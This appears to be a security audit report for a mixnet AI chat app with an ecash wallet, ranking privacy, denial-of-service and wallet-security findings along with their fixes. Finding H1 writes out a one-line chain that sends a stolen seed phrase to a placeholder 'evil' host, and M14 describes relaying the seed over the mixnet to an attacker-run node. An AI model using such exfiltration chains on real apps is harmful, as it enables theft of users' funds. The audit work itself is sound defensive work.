## CRIT

### C1 — Google Fonts over clearnet leaks the user's real IP `✓verified` · ✅ FIXED (0.1.22)
- **Category:** security / privacy · **Source:** privacy agent
- **File:** `public/index.html:12` (`@import url('https://fonts.googleapis.com/css2?...')`); CSP `src-tauri/tauri.conf.json:31,33` allows `fonts.googleapis.com` + `fonts.gstatic.com`
- **Issue:** The stylesheet imports 6 font families directly from Google; the production CSP explicitly permits it. The webview issues an HTTPS request to Google from the user's **real IP**, entirely outside the Nym mixnet. No fonts are vendored locally.
- **Impact:** Every launch ties "this IP runs ScrambleAI" to Google (IP + timing), directly defeating the product's core "only over the mixnet / no clearnet" guarantee. A network observer or Google can correlate usage to an IP even though all app traffic is mixnet-routed.
- **Fix:** Vendor the fonts under `public/vendor/fonts/`, reference via local `@font-face`, and tighten `style-src`/`font-src` to `'self'`.
- **DONE (0.1.22):** All 6 families vendored locally (21 woff2, latin subset, `public/vendor/fonts/`) via a build-time fetch; `@import` replaced with inline local `@font-face`; CSP now `style-src 'self' 'unsafe-inline'` + `font-src 'self'` (no Google origins). Verified: no `googleapis`/`gstatic` reference remains in the app. The webview makes zero clearnet requests for fonts — the leak is closed by *not fetching at all*, which is stronger than a mixnet-routed fetch (that would still touch Google's servers).

## HIGH

### H1 — `open_external` is an unrestricted clearnet egress that defeats the CSP `✓verified` · ✅ FIXED (0.2.0): on iOS the seed is NEVER returned to the webview. `account_reveal`/`account_migrate_qr` present a native, biometric-gated (Face ID) Account Security screen (`ios_secure`); the 24 words are shown only in a native alert. XSS can at most pop the sheet — it can neither tap the native reveal action nor read the phrase, so there is nothing to exfiltrate via `open_external`.
- **Category:** security · **Source:** secret-exfil agent
- **File:** `src-tauri/src/lib.rs:1399-1417` (`open_external`), `:768-775` (`account_reveal`)
- **Issue:** The CSP is deliberately tight (`connect-src 'self' ipc:`, `img-src 'self' data: blob:`) to stop a webview XSS exfiltrating the wallet. `open_external` bypasses the webview network layer entirely and validates **only the URL scheme** — no host allowlist. `account_reveal` returns the raw mnemonic to any webview caller with no user-presence check.
- **Impact:** Any residual DOM-XSS becomes full seed theft despite the hardened CSP: `invoke('account_reveal')` → `invoke('open_external',{url:'https://evil/?s='+seed})` → OS browser silently GETs the 24 words to the attacker. Same primitive exfiltrates held ecash.
- **Fix:** Host-allowlist `open_external` (known provider/checkout domains) or a user-confirm dialog showing the target host; gate `account_reveal`/`account_migrate_qr` behind an OS user-presence check.
- **Note:** Exploitation is gated on a script-executing XSS. The current CSP (`script-src` has no `'unsafe-inline'`) blocks the injection vectors found (see H6), so this is today a serious defense-in-depth hole, not a proven live exploit. On a seed-bearing app it should still close.

### H2 — Sequential dispatch loop blocks the whole server on every provider call `✓verified` · ✅ FIXED (0.2.2): full concurrency refactor via the ACTOR model — `chat::handle` split into `reserve()` (loop-side, fast: sig-verify + reserve + resolve uploads), `run_provider()` (spawned task, the slow HTTP, holds NO money state), and `settle()` (loop-side, fast: price + settle/refund + reply cache). main.rs reserves on the loop, spawns the provider call, and settles the result back on the loop through an mpsc channel — so the session counter/balance are only ever touched from the single dispatch thread (no shared mutable money state, no locks, no double-spend race), while payments and other chats keep flowing instead of blocking behind a slow provider call. Two concurrency tests prove it: overlapping reserves hold both worst-case ceilings then settle to `start − costA − costB` (no double-spend / no leaked reservation), and a lost-reply replay returns the cached reply without recharging. Provider timeouts stay capped at 60s as defence-in-depth.
- **Category:** availability · **Source:** server agent + DoS agent (independent)
- **File:** `server/src/main.rs:199-242` (serial `for m in messages { … .await }`); `chat.rs:173-204` (free tier, no signature/session), `:373-379` (pollinations 180s timeout)
- **Issue:** Messages are handled one at a time, each provider round-trip `.await`-ed inline — no `tokio::spawn`, no worker pool. A single in-flight upstream call holds the entire loop. A `Tier::Free` model is served with no auth at all and the pollinations adapter widens the timeout to 180s.
- **Impact:** One unauthenticated request occupies the whole server for up to 180s; repeating them keeps it continuously blocked — zero-cost availability DoS. Even normal two-user load serializes badly.
- **Fix:** Spawn per-message tasks with shared `sessions`/`paywall`/`quorum` behind an async mutex or an actor/command channel, so state mutation + persistence stay serialized while network I/O runs concurrently.

### H3 — `entitlement` runs an unauthenticated gateway sweep before any signature check `✓verified` · ✅ FIXED (0.1.23): the `entitlement` handler now checks the account signature BEFORE any sweep, and sweeps ONLY that account's still-pending invoices (`sweep_account`).
- **Category:** security · **Source:** server agent + DoS agent (independent)
- **File:** `server/src/pay.rs:214-217` (`"entitlement" => { self.sweep(gateway).await; self.entitlement_reply(…) }`), sweep `:171-186`, BTCPay `check_status` 20s `:604-611`
- **Issue:** For `kind:"entitlement"`, `sweep` runs **first, unconditionally**, before the account-signature check inside `entitlement_reply`. `sweep` iterates every non-paid invoice within a 48h window and issues one outbound gateway `check_status` per invoice (BTCPay: up to 20s each). No rate limit applies (only `invoice.create` calls `admit_invoice`).
- **Impact:** A bare `{"kind":"entitlement"}` (no signature) forces N serial 20s external HTTP calls that — via the sequential loop (H2) — wedge the entire server for minutes; also bypasses the 30/min invoice throttle. Since accounts are free to mint (id = `sha256(pubkey)`, no registry), a signed variant is also effectively unauthenticated.
- **Fix:** Check the account signature **before** sweeping; rate-limit `entitlement`; only sweep the authenticated account's invoices; move sweeping to a bounded background task; expire the invoice map.

### H4 — Unbounded, persisted nonce set on the un-throttled `entitlement` path `✓verified` · ✅ FIXED (0.2.0): the burned-nonce store is bounded to MAX_NONCES=100k with FIFO eviction (`nonce_fifo`), so a signed-nonce flood can no longer grow it (and the snapshot blob) without limit. Combined with H3 (auth-before-work), the OOM/disk-full DoS is closed.
- **Category:** security / DoS · **Source:** DoS agent (also money + server agents on growth)
- **File:** `server/src/pay.rs:73` (`nonces: HashSet<String>` — **no `#[serde(skip)]`**, unlike `acct_hits`/`global_hits` at `:76,:78`), `:94-103` (`burn_nonce`)
- **Issue:** Every account-signed `entitlement`/invoice/withdraw burns a nonce into `nonces` and bumps `rev`; the set is serialized into every `snapshot()` and written to SQLite on each rev bump. There is no cap and no eviction. Combined with free account minting and no rate limit (H3), an attacker signs an unlimited stream of fresh nonces.
- **Impact:** Sustained flooding grows the set without bound in RAM **and** rewrites an ever-larger JSON blob to disk on every request → quadratic per-request cost, then OOM / disk-full → crash-loop under `Restart=always`.
- **Fix:** Rate-limit the path (H3); bound the nonce store (LRU/expiry) or replace per-nonce storage with a time-windowed nonce / per-account monotonic counter that can be pruned.

### H5 — Metadata-strip failure silently sends the ORIGINAL file (EXIF/GPS, PDF Info+XMP) `✓verified` · ✅ FIXED (0.1.23): `updateSendEnabled` now hard-disables `#send` while `pendingFile.metaState.ok === false`, so a file whose metadata could not be stripped cannot be sent.
- **Category:** security / privacy · **Source:** privacy agent
- **File:** `public/index.html:1909-1917` (catch fallbacks keep raw bytes), `:1819` (`updateSendEnabled` gates on busy/scanning/empty — **not** on `metaState.ok`), send uses `file.bytes`
- **Issue:** On any strip error the catch block keeps the raw bytes (`bytes = new Uint8Array(await f.arrayBuffer())`) and sets `metaState.ok=false` — the only consequence is a warning chip. `stripImageMeta` throws when both `createImageBitmap` and the `<img>` fallback fail (realistic for HEIC/HEIF on WebView2/WebKitGTK); `stripPdfMeta` throws on malformed/encrypted PDFs. The send path is not gated on `metaState.ok`, so the raw bytes upload.
- **Impact:** The exact data the product promises to remove — GPS coordinates, camera serial, capture timestamps, PDF author/producer, the XMP stream — is uploaded intact across the mixnet to the server and provider, with only a passive warning the user can miss.
- **Fix:** Treat a failed strip as a hard stop — refuse to send, or require an explicit confirm (like the content guard's `showGuard`). At minimum disable `#send` while `pendingFile.metaState && !pendingFile.metaState.ok`.

### H6 — Unescaped server-controlled data in DOM sinks (defense-in-depth) `✓verified` · ✅ FIXED (0.1.23): `tiers` coerced to a plain integer in `renderTiers`; `watch.height` wrapped in `esc(String(...))` in `updateWatch`. (QR-as-module-data still open — tracked separately.)
- **Category:** security · **Source:** frontend agent
- **File:** `public/index.html:3095` (`renderTiers` — `data-args="${t}">$${t}`, `t` from server `s.tiers`), `:3239` (`updateWatch` — `watch.height` raw), `:3252`/`:2930` (`qr` field injected as raw HTML)
- **Issue:** These are the only server-derived values in the file rendered into `innerHTML` without `esc()`/numeric coercion (every sibling escapes). A malicious/compromised scrai-server (explicitly in the threat model) returning a non-numeric `tiers` entry or `watch.height` injects markup into the Buy/watch UI. The `qr` field is raw SVG from the backend — safe **iff** the local Rust core generates it (`qr_svg` at `lib.rs:229`), unsafe if it ever relays server-supplied SVG.
- **Impact:** In the packaged app the CSP (`script-src` without `'unsafe-inline'`) blocks the injected handler from executing, so this is defense-in-depth — but in the **dev HTTP-bridge browser there is no CSP**, so the injection is live there. Chained with H1 it would become seed exfil if script ever executes.
- **Fix:** `escAttr(String(t))` / `esc(String(watch.height ?? "?"))`; coerce `tiers` to integers on ingest; have the core return QR module-data (not a raw SVG string). Don't treat CSP as the only barrier.

## MED

### M1 — Graduated blacklist is computed and persisted but never enforced `✓verified` · ✅ FIXED (0.2.3): withdraw gate enforces `is_blacklisted`
- **Category:** security · **Source:** core agent
- **File:** `core/src/quorum.rs:224-227` (`is_blacklisted` — **zero callers**), ban computed at `:178-203`; withdraw gate `server/src/pay.rs` `gate_withdraw` never receives the ecash `PublicKeyUser`
- **Issue:** `submit()` fully computes and persists offenses + the `banned` verdict, and `is_blacklisted()` is documented as the enforcement point — but nothing calls it. The withdraw gate checks only entitlement/payment.
- **Impact:** A proven repeat double-spender is never locked out of withdrawing fresh ticketbooks. Per-coin protection still holds (reused serials always refused), so this is not fund theft — the anti-griefing layer is simply inert, and the doc comment claiming enforcement is misleading.
- **Fix:** Have the withdraw gate call `is_blacklisted(&user_pk)` before issuing, threading the ecash `PublicKeyUser` into `gate_withdraw`.

### M2 — Quadratic state persistence: every mutation rewrites the whole growing blob `✓verified`
- **Category:** efficiency · **Source:** core agent + server agent
- **File:** `core/src/quorum.rs:142-144` (full-store `snapshot`), `server/src/main.rs:295-319` (snapshot+`save_many` on any rev change); `Pay.invoices/entitlements/nonces`, `SessionStore`, `QuorumStore` never pruned
- **Issue:** On every request that advances a revision, the entire changed store is serialized to one JSON blob and fsynced. The quorum retains the full `Payment` for every spend forever (needed for double-spend attribution); nonces/invoices/sessions never expire. Per-request cost grows with total history → O(n²) over the server's lifetime. A 1-SCRAI chat rewrites the full sessions blob; each accepted spend re-serializes all prior BLS payments.
- **Fix:** Move to per-row tables (serials/nonces/invoices/sessions) as `store.rs:8-10` already anticipates; expire settled/old invoices, nonces past their validity window, and idle sessions; prune quorum records past coin expiry.

### M3 — Chat cost ceiling under-reserves large/multi-page attachments → below-cost inference `✓verified`
- **Category:** correctness / economic · **Source:** money agent
- **File:** `server/src/chat.rs:55,76-91` (`ATTACHMENT_INPUT_TOKENS = 4096` flat per attachment)
- **Issue:** The worst-case reserve counts each attachment as a flat 4096 tokens regardless of real weight. One attachment can be a 100-page PDF or high-res image billing tens of thousands of actual prompt tokens (Gemini `promptTokenCount`). `settle` caps the user charge at the reservation, so the user pays the ceiling while the operator pays true provider cost.
- **Impact:** A funded client repeatedly submits document-heavy requests (bounded only by 48 MiB) and is charged the modest ceiling each time — a repeatable operator-margin drain (not a free ride, not a protocol break).
- **Fix:** Reserve attachments by declared size/type (per-image tile, per-PDF-page from byte size) or a per-byte term; or cap billable input at the reserved ceiling at settle time.

### M4 — Four money commands registered but never called, and skip the op-lock `✓verified`
- **Category:** dead-code / security · **Source:** client agent
- **File:** `src-tauri/src/lib.rs:414` (`coconut_withdraw_test`), `:429` (`coconut_withdraw`), `:450` (`coconut_spend`), registered at `:1447`; `backend.js` exposes only `collect`/`redeem`/`chat`
- **Issue:** Grep finds zero callers, but they stay in `generate_handler!` so remain invokable. Unlike the live money paths, `coconut_withdraw`/`_test`/`spend` do **not** take `transport.begin_op()`. `coconut_spend` does an unsynchronized read-modify-write of `wallet.json` (load `:462` → save `:499`).
- **Impact:** Dead surface holding live spend authority. If invoked (a malicious/XSS frontend, or future accidental wiring) concurrently with `chat`'s auto-redeem, the two unsynchronized wallet writes can clobber `pending_spend` or drop a `coconut_purses` entry → irreversible bearer-ecash loss.
- **Fix:** Remove the unused commands from `invoke_handler` (delete if superseded by `collect`/`redeem`); if any must stay, wrap them in `begin_op()`.

### M5 — `derive_session_keys` runs PBKDF2 twice on the hot path `✓verified`
- **Category:** efficiency · **Source:** client agent
- **File:** `src-tauri/src/account.rs:88-97`
- **Issue:** `from_mnemonic` already derives the BIP39 seed (PBKDF2-HMAC-SHA512 × 2048) and discards it; `derive_session_keys` then re-parses the mnemonic and re-derives the same seed — two full key-stretch passes per call. Called in `state` (`:673`), `chat` (`:1083`), `redeem_coconut` (`:532`), all routine UI paths.
- **Fix:** Have `from_mnemonic` return/expose the seed it already computed and reuse it.

### M6 — `state`/`collect` decrypt the wallet 3× per call (redundant keychain hits) `✓verified`
- **Category:** efficiency · **Source:** client agent
- **File:** `src-tauri/src/lib.rs:645,684,689` (`state`); `coconut_held_scrai:614-622`; `collect:991-1020`
- **Issue:** Each `wallet::load` on desktop = an OS-keychain round-trip + AES-GCM decrypt. `state` loads once, then calls `coconut_held_scrai` twice, each reloading and re-restoring every purse — 3 keychain fetches + 3 decrypts per `state` poll. `collect` reloads inside its loop.
- **Fix:** Load once per command; pass `&Wallet` into a `held_scrai(&w)` helper; cache the process-lifetime keychain key.

### M7 — iOS stores the mnemonic + bearer purses as plaintext `✓verified`
- **Category:** security · **Source:** client agent + secret-exfil agent
- **File:** `src-tauri/src/wallet.rs:116-123,262-273`
- **Issue:** On iOS the wallet JSON (mnemonic + purses) is written unencrypted, relying on iOS Data Protection + sandbox only (documented tradeoff — the `keyring` crate round-trips unreliably on iOS dev builds). Desktop keeps AES-GCM + keychain and is fail-closed.
- **Impact:** Seed + bearer ecash readable from a Finder/iTunes backup, jailbreak, or forensic image where Data Protection isn't at the strongest class.
- **Fix:** Store the key in the iOS Keychain (`kSecAttrAccessibleWhenUnlockedThisDeviceOnly`) via the platform API, or set `NSFileProtectionComplete` explicitly. Or accept + document as the mobile seam.

### M8 — Client trusts server-supplied `total_coins` → unbounded allocation → client OOM `✓verified`
- **Category:** security / DoS · **Source:** DoS agent
- **File:** `src-tauri/src/lib.rs:388-390` (Purse built with server `total_coins`), `core/src/purse.rs:63` (`Parameters::new(self.total_coins)`)
- **Issue:** `total_coins` comes straight from the (malicious-capable) server's `FedResponse::Keys` and is stored verbatim — it is **not** cryptographically bound to the coin material. The next spend/redeem calls `Parameters::new(self.total_coins)`, which builds O(L) group elements.
- **Impact:** A server the user paid returns `total_coins = u64::MAX`; withdraw succeeds, and the first spend/redeem attempts a massive allocation → client OOM / multi-minute hang. Precondition: the user withdrew from that server (within the "server may be malicious" model; not remote-unauth → MED).
- **Fix:** Clamp `total_coins` to the expected ticketbook size (500) before constructing the `Purse`; reject a Keys reply exceeding a sane bound.

### M9 — A fresh `reqwest::Client` is built for every outbound HTTP call `✓verified`
- **Category:** efficiency · **Source:** server agent
- **File:** `server/src/http.rs:19-26`; 13 call sites across chat/pay/catalog/nyx/main
- **Issue:** `http::client()` rebuilds the client (connection pool + TLS cache) per request. `reqwest::Client` is designed to be built once and cloned.
- **Fix:** One `Client` at startup / `OnceLock`, clone it (clones share the pool); keep per-request `.timeout` overrides.

### M10 — Request body JSON-parsed several times per message (up to 48 MiB) `✓verified`
- **Category:** efficiency · **Source:** server agent
- **File:** `server/src/main.rs:206-209,245-251,270-273`; `chat.rs:143`
- **Issue:** The dispatch loop parses the body for `kind`, then again for the `fed_op` log label, `chat::handle` parses it again, and the response is re-parsed for the `errored` metric — several full parses of a body allowed up to 48 MiB. The metrics/label code added parses.
- **Fix:** Parse once into a `Value`, derive `kind`/`fed_op` from it, pass it (or extracted fields) into the handlers.

### M11 — Gemini API key sent in the URL query string `✓verified`
- **Category:** security · **Source:** legacy-TS agent
- **File:** `src/adapters/gemini.ts:87,98` (`?key=${apiKey}`)
- **Issue:** The key is embedded in the URL, while the sibling `gemini-image.ts:65-67` deliberately uses the `x-goog-api-key` header and documents why (URL secrets land in proxy/access logs). Dev-path only (src/ never ships), but inconsistent with the project's own practice.
- **Fix:** Move the key to `x-goog-api-key` in `discover()`+`stream()`.

### M12 — Duplicated money/billing/pricing logic between TS (`src/`) and Rust `✓verified`
- **Category:** maintenance / correctness · **Source:** legacy-TS agent
- **File:** `src/pricing.ts`, `src/billing.ts`, `src/money/*` vs `core/` + `server/`; e.g. `src/server.ts:129-134` `ceilingFor()` re-implements `chat.rs` reservation math
- **Issue:** The dev HTTP bridge runs the full money layer in-process, so pricing/ceiling/ecash logic exists twice in two languages with no shared source of truth. `public/backend.js` is validated against the TS side.
- **Impact:** Any pricing/tier/ceiling change must land in both trees or browser-dev silently diverges from shipped behaviour.
- **Fix:** Shrink the TS money layer to a dev mock, or generate shared constants from one file; at minimum a test asserting TS constants == Rust values.

### M13 — nym-client binary installed unverified when the release omits `hashes.json` `✓verified`
- **Category:** security · **Source:** legacy-TS agent
- **File:** `src/nym/install.ts:86-95`
- **Issue:** The checksum gate is conditional (`if (expected && …)`); when `publishedHash()` returns null (no hashes file, or a swallowed fetch error at `:52-54`) the download is written and `chmod 0755` anyway. Dev/CLI-path only.
- **Fix:** Pin known-good SHA-256 values, or refuse to `chmod +x` without a verified hash (require an explicit `--unverified` override).

### M14 — `set_server`+`chat` can pump the seed over the mixnet to an attacker node `✓verified`
- **Category:** security · **Source:** secret-exfil agent
- **File:** `src-tauri/src/lib.rs:698-713` (`set_server`), `:1036-1115` (`chat`)
- **Issue:** `set_server` validates only the address *format*, so any valid Nym recipient (incl. an attacker node) is accepted; `chat` forwards `messages` verbatim. A webview XSS can repoint the server and send the seed as chat content — a seed egress that survives the CSP (the mixnet send is in Rust). Not reachable from untrusted *content* alone (only user gestures call `set_server`); requires attacker-run Nym infra → below H1.
- **Fix:** Same root mitigation as H1 (seed commands behind user-presence); optional explicit confirm for `set_server` changes.

## LOW

- **L1 — Corrupt/renamed persisted blob fails OPEN on the double-spend quorum** `✓verified` · `core/src/quorum.rs:137-139`, `session.rs:57-59`. `from_snapshot` does `unwrap_or_default()`, so a present-but-unparseable blob silently resets the burned-serial set (reopens spent coins) and zeroes balances, with no operator signal. Only reachable via external corruption (normal writes are valid+atomic). Fix: distinguish absent (OK) from present-but-unparseable (fatal — halt, require operator action).

## What's solid (positives)

- **Money/crypto core:** every double-spend / overspend / forge / replay attack traced to a PREVENTED verdict with cited guards. `reserve` enforces `counter==stored+1` atomically; coconut `spend_verify` binds `payment.ss.len()` to the credited value; redeem ordering (verify→burn serial→credit) is atomic (`save_many`) and idempotent on replay; the single-authority FATAL guard is correctly gated.
- **Wallet-at-rest (desktop):** AES-256-GCM, random 12-byte nonce/write, random 32-byte key, atomic temp+fsync+rename, `0600`, fail-closed on keychain failure (never writes plaintext or an empty overwrite), corrupt files preserved via `backup_and_default`. GCM auth-reject tested.
- **Frontend escaping:** the mnemonic never reaches a URL / `localStorage` / a log; shown only `esc()`-escaped in a `<pre>`, copied via `navigator.clipboard`, cleared on modal close. AI responses render as escaped plain text (no markdown→HTML). `imgSrc` enforces MIME allowlist + `B64_ONLY` (the C1 mitigation). No `eval`/`new Function`.
- **Privacy:** server logs carry no content/account/session ids/IPs; the `daily` metrics table is aggregate-only (day + 4 counters); session↔account unlinkability holds (blind coconut severs the link at withdraw); OCR + guard are on-device with no network; no analytics/telemetry anywhere.
- **DoS surface:** envelope decode is `unwrap_or(Null)` everywhere, `pay_info` uses `try_into` with an error arm, arithmetic is saturating, uploads cap bytes/chunks/concurrency before allocation — no memory-safety panics on untrusted input were found.

## Coverage gaps

- `nym-compact-ecash` ZK internals (`spend_verify`, `identify`, `Parameters::new`, `aggregate_wallets`) treated as trusted — not re-proved; recommend fuzzing at the crate boundary (esp. for M8 and any internal panic on crafted-but-deserializable inputs).
- No runtime/dynamic verification — CSP enforcement, keychain behaviour, the mixnet egress, and whether a given HEIC/encrypted PDF actually triggers H5's fallback were reasoned from source, not executed per target webview.
- Whether the legacy TS CLI scripts are still part of anyone's dev workflow is a human question (affects the "retire vs keep" call on ~4k LOC).
- `server/src/nyx.rs` on-chain response parsing was read for the money path but not adversarially fuzzed against hostile LCD responses.
